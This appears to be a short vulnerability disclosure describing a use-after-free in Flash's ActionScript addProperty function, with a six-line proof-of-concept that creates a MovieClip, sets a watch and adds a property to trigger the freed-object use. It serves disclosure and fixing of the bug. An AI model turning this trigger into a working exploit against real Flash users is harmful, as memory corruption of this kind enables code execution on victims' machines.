 
There is a use-after-free in addProperty. If a property is added to a MovieClip object that already has a watch defined, and the watch deleted the MovieClip, it is used after it is freed.
 
A minimal PoC follows:
 
var t = this.createEmptyMovieClip( "t", 1);
t.watch("a", func);
t.addProperty("a", func, func);
 
function func(){
     
    trace("a");
     
    }
 
A sample fla and swf are attached.
